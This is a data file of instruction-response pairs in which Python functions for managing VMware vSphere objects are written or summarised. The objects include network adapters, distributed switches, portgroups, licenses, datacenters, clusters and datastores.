{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the network adapter type.", "response": "def get_network_adapter_object_type(adapter_object):\n    '''\n    Returns the network adapter type.\n\n    adapter_object\n        The adapter object from which to obtain the network adapter type.\n    '''\n    if isinstance(adapter_object, vim.vm.device.VirtualVmxnet2):\n        return 'vmxnet2'\n    if isinstance(adapter_object, vim.vm.device.VirtualVmxnet3):\n        return 'vmxnet3'\n    if isinstance(adapter_object, vim.vm.device.VirtualVmxnet):\n        return 'vmxnet'\n    if isinstance(adapter_object, vim.vm.device.VirtualE1000e):\n        return 'e1000e'\n    if isinstance(adapter_object, vim.vm.device.VirtualE1000):\n        return 'e1000'\n\n    raise ValueError('An unknown network adapter object type.')"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_dvss(dc_ref, dvs_names=None, get_all_dvss=False):\n    '''\n    Returns distributed virtual switches (DVSs) in a datacenter.\n\n    dc_ref\n        The parent datacenter reference.\n\n    dvs_names\n        The names of the DVSs to return. Default is None.\n\n    get_all_dvss\n        Return all DVSs in the datacenter. Default is False.\n    '''\n    dc_name = get_managed_object_name(dc_ref)\n    log.trace(\n        'Retrieving DVSs in datacenter \\'%s\\', dvs_names=\\'%s\\', get_all_dvss=%s',\n        dc_name,\n        ','.join(dvs_names) if dvs_names else None,\n        get_all_dvss\n    )\n    properties = ['name']\n    traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n        path='networkFolder',\n        skip=True,\n        type=vim.Datacenter,\n        selectSet=[vmodl.query.PropertyCollector.TraversalSpec(\n            path='childEntity',\n            skip=False,\n            type=vim.Folder)])\n    service_instance = get_service_instance_from_managed_object(dc_ref)\n    items = [i['object'] for i in\n             get_mors_with_properties(service_instance,\n                                      vim.DistributedVirtualSwitch,\n                                      container_ref=dc_ref,\n                                      property_list=properties,\n                                      traversal_spec=traversal_spec)\n             if get_all_dvss or (dvs_names and i['name'] in dvs_names)]\n    return items", "response": "Returns a list of distributed virtual switches in a datacenter."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nretrieve the network folder of a datacenter", "response": "def get_network_folder(dc_ref):\n    '''\n    Retrieves the network folder of a datacenter\n    '''\n    dc_name = get_managed_object_name(dc_ref)\n    log.trace('Retrieving network folder in datacenter \\'%s\\'', dc_name)\n    service_instance = get_service_instance_from_managed_object(dc_ref)\n    traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n        path='networkFolder',\n        skip=False,\n        type=vim.Datacenter)\n    entries = get_mors_with_properties(service_instance,\n                                       vim.Folder,\n                                       container_ref=dc_ref,\n                                       property_list=['name'],\n                                       traversal_spec=traversal_spec)\n    if not entries:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Network folder in datacenter \\'{0}\\' wasn\\'t retrieved'\n            ''.format(dc_name))\n    return entries[0]['object']"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a distributed virtual switch in a datacenter.", "response": "def create_dvs(dc_ref, dvs_name, dvs_create_spec=None):\n    '''\n    Creates a distributed virtual switches (DVS) in a datacenter.\n    Returns the reference to the newly created distributed virtual switch.\n\n    dc_ref\n        The parent datacenter reference.\n\n    dvs_name\n        The name of the DVS to create.\n\n    dvs_create_spec\n        The DVS spec (vim.DVSCreateSpec) to use when creating the DVS.\n        Default is None.\n    '''\n    dc_name = get_managed_object_name(dc_ref)\n    log.trace('Creating DVS \\'%s\\' in datacenter \\'%s\\'', dvs_name, dc_name)\n    if not dvs_create_spec:\n        dvs_create_spec = vim.DVSCreateSpec()\n    if not dvs_create_spec.configSpec:\n        dvs_create_spec.configSpec = vim.VMwareDVSConfigSpec()\n        dvs_create_spec.configSpec.name = dvs_name\n    netw_folder_ref = get_network_folder(dc_ref)\n    try:\n        task = netw_folder_ref.CreateDVS_Task(dvs_create_spec)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    wait_for_task(task, dvs_name, six.text_type(task.__class__))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update_dvs(dvs_ref, dvs_config_spec):\n    '''\n    Updates a distributed virtual switch with the config_spec.\n\n    dvs_ref\n        The DVS reference.\n\n    dvs_config_spec\n        The updated config spec (vim.VMwareDVSConfigSpec) to be applied to\n        the DVS.\n    '''\n    dvs_name = get_managed_object_name(dvs_ref)\n    log.trace('Updating dvs \\'%s\\'', dvs_name)\n    try:\n        task = dvs_ref.ReconfigureDvs_Task(dvs_config_spec)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    wait_for_task(task, dvs_name, six.text_type(task.__class__))", "response": "Updates a distributed virtual switch with the config_spec."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_dvs_network_resource_management_enabled(dvs_ref, enabled):\n    '''\n    Sets whether NIOC is enabled on a DVS.\n\n    dvs_ref\n        The DVS reference.\n\n    enabled\n        Flag specifying whether NIOC is enabled.\n    '''\n    dvs_name = get_managed_object_name(dvs_ref)\n    log.trace('Setting network resource management enable to %s on '\n              'dvs \\'%s\\'', enabled, dvs_name)\n    try:\n        dvs_ref.EnableNetworkResourceManagement(enable=enabled)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)", "response": "Sets whether NIOC is enabled on a DVS."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_dvportgroups(parent_ref, portgroup_names=None,\n                     get_all_portgroups=False):\n    '''\n    Returns distributed virtual porgroups (dvportgroups).\n    The parent object can be either a datacenter or a dvs.\n\n    parent_ref\n        The parent object reference. Can be either a datacenter or a dvs.\n\n    portgroup_names\n        The names of the dvss to return. Default is None.\n\n    get_all_portgroups\n        Return all portgroups in the parent. Default is False.\n    '''\n    if not (isinstance(parent_ref,\n                       (vim.Datacenter, vim.DistributedVirtualSwitch))):\n        raise salt.exceptions.ArgumentValueError(\n            'Parent has to be either a datacenter, '\n            'or a distributed virtual switch')\n    parent_name = get_managed_object_name(parent_ref)\n    log.trace('Retrieving portgroup in %s \\'%s\\', portgroups_names=\\'%s\\', '\n              'get_all_portgroups=%s',\n              type(parent_ref).__name__,\n              parent_name,\n              ','.join(portgroup_names) if portgroup_names else None,\n              get_all_portgroups)\n    properties = ['name']\n    if isinstance(parent_ref, vim.Datacenter):\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            path='networkFolder',\n            skip=True,\n            type=vim.Datacenter,\n            selectSet=[vmodl.query.PropertyCollector.TraversalSpec(\n                path='childEntity',\n                skip=False,\n                type=vim.Folder)])\n    else:  # parent is distributed virtual switch\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            path='portgroup',\n            skip=False,\n            type=vim.DistributedVirtualSwitch)\n\n    service_instance = get_service_instance_from_managed_object(parent_ref)\n    items = [i['object'] for i in\n             get_mors_with_properties(service_instance,\n                                      vim.DistributedVirtualPortgroup,\n                                      container_ref=parent_ref,\n                                      property_list=properties,\n                                      traversal_spec=traversal_spec)\n             if get_all_portgroups or\n             (portgroup_names and i['name'] in portgroup_names)]\n    return items", "response": "Returns a list of distributed virtual porgroups in a distributed virtual switch."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the uplink distributed virtual portgroup of a distributed virtual switch", "response": "def get_uplink_dvportgroup(dvs_ref):\n    '''\n    Returns the uplink distributed virtual portgroup of a distributed virtual\n    switch (dvs)\n\n    dvs_ref\n        The dvs reference\n    '''\n    dvs_name = get_managed_object_name(dvs_ref)\n    log.trace('Retrieving uplink portgroup of dvs \\'%s\\'', dvs_name)\n    traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n        path='portgroup',\n        skip=False,\n        type=vim.DistributedVirtualSwitch)\n    service_instance = get_service_instance_from_managed_object(dvs_ref)\n    items = [entry['object'] for entry in\n             get_mors_with_properties(service_instance,\n                                      vim.DistributedVirtualPortgroup,\n                                      container_ref=dvs_ref,\n                                      property_list=['tag'],\n                                      traversal_spec=traversal_spec)\n             if entry['tag'] and\n             [t for t in entry['tag'] if t.key == 'SYSTEM/DVS.UPLINKPG']]\n    if not items:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Uplink portgroup of DVS \\'{0}\\' wasn\\'t found'.format(dvs_name))\n    return items[0]"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a distributed virtual portgroup on a distributed virtual switch", "response": "def create_dvportgroup(dvs_ref, spec):\n    '''\n    Creates a distributed virtual portgroup on a distributed virtual switch\n    (dvs)\n\n    dvs_ref\n        The dvs reference\n\n    spec\n        Portgroup spec (vim.DVPortgroupConfigSpec)\n    '''\n    dvs_name = get_managed_object_name(dvs_ref)\n    log.trace('Adding portgroup %s to dvs \\'%s\\'', spec.name, dvs_name)\n    log.trace('spec = %s', spec)\n    try:\n        task = dvs_ref.CreateDVPortgroup_Task(spec)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    wait_for_task(task, dvs_name, six.text_type(task.__class__))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update_dvportgroup(portgroup_ref, spec):\n    '''\n    Updates a distributed virtual portgroup\n\n    portgroup_ref\n        The portgroup reference\n\n    spec\n        Portgroup spec (vim.DVPortgroupConfigSpec)\n    '''\n    pg_name = get_managed_object_name(portgroup_ref)\n    log.trace('Updating portgrouo %s', pg_name)\n    try:\n        task = portgroup_ref.ReconfigureDVPortgroup_Task(spec)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    wait_for_task(task, pg_name, six.text_type(task.__class__))", "response": "Updates a distributed virtual portgroup with the given portgroup."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of standard switch networks.", "response": "def get_networks(parent_ref, network_names=None, get_all_networks=False):\n    '''\n    Returns networks of standard switches.\n    The parent object can be a datacenter.\n\n    parent_ref\n        The parent object reference. A datacenter object.\n\n    network_names\n        The name of the standard switch networks. Default is None.\n\n    get_all_networks\n        Boolean indicates whether to return all networks in the parent.\n        Default is False.\n    '''\n\n    if not isinstance(parent_ref, vim.Datacenter):\n        raise salt.exceptions.ArgumentValueError(\n            'Parent has to be a datacenter.')\n    parent_name = get_managed_object_name(parent_ref)\n    log.trace('Retrieving network from %s \\'%s\\', network_names=\\'%s\\', '\n              'get_all_networks=%s',\n              type(parent_ref).__name__,\n              parent_name,\n              ','.join(network_names) if network_names else None,\n              get_all_networks)\n    properties = ['name']\n    service_instance = get_service_instance_from_managed_object(parent_ref)\n    traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n        path='networkFolder',\n        skip=True,\n        type=vim.Datacenter,\n        selectSet=[vmodl.query.PropertyCollector.TraversalSpec(\n            path='childEntity',\n            skip=False,\n            type=vim.Folder)])\n    items = [i['object'] for i in\n             get_mors_with_properties(service_instance,\n                                      vim.Network,\n                                      container_ref=parent_ref,\n                                      property_list=properties,\n                                      traversal_spec=traversal_spec)\n             if get_all_networks or\n             (network_names and i['name'] in network_names)]\n    return items"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a simple list of objects from a given service instance and vim_object.", "response": "def list_objects(service_instance, vim_object, properties=None):\n    '''\n    Returns a simple list of objects from a given service instance.\n\n    service_instance\n        The Service Instance for which to obtain a list of objects.\n\n    object_type\n        The type of content for which to obtain information.\n\n    properties\n        An optional list of object properties used to return reference results.\n        If not provided, defaults to ``name``.\n    '''\n    if properties is None:\n        properties = ['name']\n\n    items = []\n    item_list = get_mors_with_properties(service_instance, vim_object, properties)\n    for item in item_list:\n        items.append(item['name'])\n    return items"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the license manager.", "response": "def get_license_manager(service_instance):\n    '''\n    Returns the license manager.\n\n    service_instance\n        The Service Instance Object from which to obrain the license manager.\n    '''\n\n    log.debug('Retrieving license manager')\n    try:\n        lic_manager = service_instance.content.licenseManager\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    return lic_manager"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the license assignment manager.", "response": "def get_license_assignment_manager(service_instance):\n    '''\n    Returns the license assignment manager.\n\n    service_instance\n        The Service Instance Object from which to obrain the license manager.\n    '''\n\n    log.debug('Retrieving license assignment manager')\n    try:\n        lic_assignment_manager = \\\n                service_instance.content.licenseManager.licenseAssignmentManager\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    if not lic_assignment_manager:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'License assignment manager was not retrieved')\n    return lic_assignment_manager"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the licenses on a specific instance.", "response": "def get_licenses(service_instance, license_manager=None):\n    '''\n    Returns the licenses on a specific instance.\n\n    service_instance\n        The Service Instance Object from which to obrain the licenses.\n\n    license_manager\n        The License Manager object of the service instance. If not provided it\n        will be retrieved.\n    '''\n\n    if not license_manager:\n        license_manager = get_license_manager(service_instance)\n    log.debug('Retrieving licenses')\n    try:\n        return license_manager.licenses\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add_license(service_instance, key, description, license_manager=None):\n    '''\n    Adds a license.\n\n    service_instance\n        The Service Instance Object.\n\n    key\n        The key of the license to add.\n\n    description\n        The description of the license to add.\n\n    license_manager\n        The License Manager object of the service instance. If not provided it\n        will be retrieved.\n    '''\n    if not license_manager:\n        license_manager = get_license_manager(service_instance)\n    label = vim.KeyValue()\n    label.key = 'VpxClientLicenseLabel'\n    label.value = description\n    log.debug('Adding license \\'%s\\'', description)\n    try:\n        vmware_license = license_manager.AddLicense(key, [label])\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    return vmware_license", "response": "Adds a license to the virtual machine."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_assigned_licenses(service_instance, entity_ref=None, entity_name=None,\n                          license_assignment_manager=None):\n    '''\n    Returns the licenses assigned to an entity. If entity ref is not provided,\n    then entity_name is assumed to be the vcenter. This is later checked if\n    the entity name is provided.\n\n    service_instance\n        The Service Instance Object from which to obtain the licenses.\n\n    entity_ref\n        VMware entity to get the assigned licenses for.\n        If None, the entity is the vCenter itself.\n        Default is None.\n\n    entity_name\n        Entity name used in logging.\n        Default is None.\n\n    license_assignment_manager\n        The LicenseAssignmentManager object of the service instance.\n        If not provided it will be retrieved.\n        Default is None.\n    '''\n    if not license_assignment_manager:\n        license_assignment_manager = \\\n                get_license_assignment_manager(service_instance)\n    if not entity_name:\n        raise salt.exceptions.ArgumentValueError('No entity_name passed')\n    # If entity_ref is not defined, then interested in the vcenter\n    entity_id = None\n    entity_type = 'moid'\n    check_name = False\n    if not entity_ref:\n        if entity_name:\n            check_name = True\n        entity_type = 'uuid'\n        try:\n            entity_id = service_instance.content.about.instanceUuid\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{0}'.format(exc.privilegeId))\n        except vim.fault.VimFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.RuntimeFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    else:\n        entity_id = entity_ref._moId\n\n    log.trace('Retrieving licenses assigned to \\'%s\\'', entity_name)\n    try:\n        assignments = \\\n                license_assignment_manager.QueryAssignedLicenses(entity_id)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n\n    if entity_type == 'uuid' and len(assignments) > 1:\n        log.trace('Unexpectectedly retrieved more than one'\n                  ' VCenter license assignment.')\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Unexpected return. Expect only a single assignment')\n\n    if check_name:\n        if entity_name != assignments[0].entityDisplayName:\n            log.trace('Getting license info for wrong vcenter: %s != %s',\n                      entity_name, assignments[0].entityDisplayName)\n            raise salt.exceptions.VMwareObjectRetrievalError(\n                'Got license assignment info for a different vcenter')\n\n    return [a.assignedLicense for a in assignments]", "response": "Returns the licenses assigned to an entity."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nassigning a license to an entity.", "response": "def assign_license(service_instance, license_key, license_name,\n                   entity_ref=None, entity_name=None,\n                   license_assignment_manager=None):\n    '''\n    Assigns a license to an entity.\n\n    service_instance\n        The Service Instance Object from which to obrain the licenses.\n\n    license_key\n        The key of the license to add.\n\n    license_name\n        The description of the license to add.\n\n    entity_ref\n        VMware entity to assign the license to.\n        If None, the entity is the vCenter itself.\n        Default is None.\n\n    entity_name\n        Entity name used in logging.\n        Default is None.\n\n    license_assignment_manager\n        The LicenseAssignmentManager object of the service instance.\n        If not provided it will be retrieved\n        Default is None.\n    '''\n    if not license_assignment_manager:\n        license_assignment_manager = \\\n                get_license_assignment_manager(service_instance)\n    entity_id = None\n\n    if not entity_ref:\n        # vcenter\n        try:\n            entity_id = service_instance.content.about.instanceUuid\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{0}'.format(exc.privilegeId))\n        except vim.fault.VimFault as exc:\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.RuntimeFault as exc:\n            raise salt.exceptions.VMwareRuntimeError(exc.msg)\n        if not entity_name:\n            entity_name = 'vCenter'\n    else:\n        # e.g. vsan cluster or host\n        entity_id = entity_ref._moId\n\n    log.trace('Assigning license to \\'%s\\'', entity_name)\n    try:\n        vmware_license = license_assignment_manager.UpdateAssignedLicense(\n            entity_id,\n            license_key,\n            license_name)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    return vmware_license"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_datacenters(service_instance, datacenter_names=None,\n                    get_all_datacenters=False):\n    '''\n    Returns all datacenters in a vCenter.\n\n    service_instance\n        The Service Instance Object from which to obtain cluster.\n\n    datacenter_names\n        List of datacenter names to filter by. Default value is None.\n\n    get_all_datacenters\n        Flag specifying whether to retrieve all datacenters.\n        Default value is None.\n    '''\n    items = [i['object'] for i in\n             get_mors_with_properties(service_instance,\n                                      vim.Datacenter,\n                                      property_list=['name'])\n             if get_all_datacenters or\n             (datacenter_names and i['name'] in datacenter_names)]\n    return items", "response": "Returns a list of datacenters in a vCenter."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a vim. Datacenter managed object.", "response": "def get_datacenter(service_instance, datacenter_name):\n    '''\n    Returns a vim.Datacenter managed object.\n\n    service_instance\n        The Service Instance Object from which to obtain datacenter.\n\n    datacenter_name\n        The datacenter name\n    '''\n    items = get_datacenters(service_instance,\n                            datacenter_names=[datacenter_name])\n    if not items:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Datacenter \\'{0}\\' was not found'.format(datacenter_name))\n    return items[0]"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a datacenter. .. versionadded:: 2017.7.0 service_instance The Service Instance Object datacenter_name The datacenter name", "response": "def create_datacenter(service_instance, datacenter_name):\n    '''\n    Creates a datacenter.\n\n    .. versionadded:: 2017.7.0\n\n    service_instance\n        The Service Instance Object\n\n    datacenter_name\n        The datacenter name\n    '''\n    root_folder = get_root_folder(service_instance)\n    log.trace('Creating datacenter \\'%s\\'', datacenter_name)\n    try:\n        dc_obj = root_folder.CreateDatacenter(datacenter_name)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    return dc_obj"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a cluster in a datacenter.", "response": "def get_cluster(dc_ref, cluster):\n    '''\n    Returns a cluster in a datacenter.\n\n    dc_ref\n        The datacenter reference\n\n    cluster\n        The cluster to be retrieved\n    '''\n    dc_name = get_managed_object_name(dc_ref)\n    log.trace('Retrieving cluster \\'%s\\' from datacenter \\'%s\\'',\n              cluster, dc_name)\n    si = get_service_instance_from_managed_object(dc_ref, name=dc_name)\n    traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n        path='hostFolder',\n        skip=True,\n        type=vim.Datacenter,\n        selectSet=[vmodl.query.PropertyCollector.TraversalSpec(\n            path='childEntity',\n            skip=False,\n            type=vim.Folder)])\n    items = [i['object'] for i in\n             get_mors_with_properties(si,\n                                      vim.ClusterComputeResource,\n                                      container_ref=dc_ref,\n                                      property_list=['name'],\n                                      traversal_spec=traversal_spec)\n             if i['name'] == cluster]\n    if not items:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Cluster \\'{0}\\' was not found in datacenter '\n            '\\'{1}\\''. format(cluster, dc_name))\n    return items[0]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a cluster in a datacenter.", "response": "def create_cluster(dc_ref, cluster_name, cluster_spec):\n    '''\n    Creates a cluster in a datacenter.\n\n    dc_ref\n        The parent datacenter reference.\n\n    cluster_name\n        The cluster name.\n\n    cluster_spec\n        The cluster spec (vim.ClusterConfigSpecEx).\n        Defaults to None.\n    '''\n    dc_name = get_managed_object_name(dc_ref)\n    log.trace('Creating cluster \\'%s\\' in datacenter \\'%s\\'',\n              cluster_name, dc_name)\n    try:\n        dc_ref.hostFolder.CreateClusterEx(cluster_name, cluster_spec)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nupdating a cluster in a datacenter", "response": "def update_cluster(cluster_ref, cluster_spec):\n    '''\n    Updates a cluster in a datacenter.\n\n    cluster_ref\n        The cluster reference.\n\n    cluster_spec\n        The cluster spec (vim.ClusterConfigSpecEx).\n        Defaults to None.\n    '''\n    cluster_name = get_managed_object_name(cluster_ref)\n    log.trace('Updating cluster \\'%s\\'', cluster_name)\n    try:\n        task = cluster_ref.ReconfigureComputeResource_Task(cluster_spec,\n                                                           modify=True)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    wait_for_task(task, cluster_name, 'ClusterUpdateTask')"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a list of datastores associated with a given service instance.", "response": "def list_datastores_full(service_instance):\n    '''\n    Returns a list of datastores associated with a given service instance.\n    The list contains basic information about the datastore:\n        name, type, url, capacity, free, used, usage, hosts\n\n    service_instance\n        The Service Instance Object from which to obtain datastores.\n    '''\n    datastores_list = list_objects(service_instance, vim.Datastore)\n\n    datastores = {}\n    for datastore in datastores_list:\n        datastores[datastore] = list_datastore_full(service_instance, datastore)\n\n    return datastores"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef list_datastore_full(service_instance, datastore):\n    '''\n    Returns a dictionary with the basic information for the given datastore:\n        name, type, url, capacity, free, used, usage, hosts\n\n    service_instance\n        The Service Instance Object from which to obtain datastores.\n\n    datastore\n        Name of the datastore.\n    '''\n    datastore_object = get_mor_by_name(service_instance, vim.Datastore, datastore)\n\n    if not datastore_object:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Datastore \\'{0}\\' does not exist.'.format(datastore)\n        )\n\n    items = {}\n    items['name'] = str(datastore_object.summary.name).replace(\"'\", \"\")\n    items['type'] = str(datastore_object.summary.type).replace(\"'\", \"\")\n    items['url'] = str(datastore_object.summary.url).replace(\"'\", \"\")\n    items['capacity'] = datastore_object.summary.capacity / 1024 / 1024\n    items['free'] = datastore_object.summary.freeSpace / 1024 / 1024\n    items['used'] = items['capacity'] - items['free']\n    items['usage'] = (float(items['used']) / float(items['capacity'])) * 100\n    items['hosts'] = []\n\n    for host in datastore_object.host:\n        host_key = str(host.key).replace(\"'\", \"\").split(\":\", 1)[1]\n        host_object = get_mor_by_moid(service_instance, vim.HostSystem, host_key)\n        items['hosts'].append(host_object.name)\n\n    return items", "response": "Returns a dictionary with the basic information for the given datastore."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets reference to an object of specified object type and name", "response": "def get_mor_by_name(si, obj_type, obj_name):\n    '''\n    Get reference to an object of specified object type and name\n\n    si\n        ServiceInstance for the vSphere or ESXi server (see get_service_instance)\n\n    obj_type\n        Type of the object (vim.StoragePod, vim.Datastore, etc)\n\n    obj_name\n        Name of the object\n    '''\n    inventory = get_inventory(si)\n    container = inventory.viewManager.CreateContainerView(inventory.rootFolder, [obj_type], True)\n    for item in container.view:\n        if item.name == obj_name:\n            return item\n    return None"}
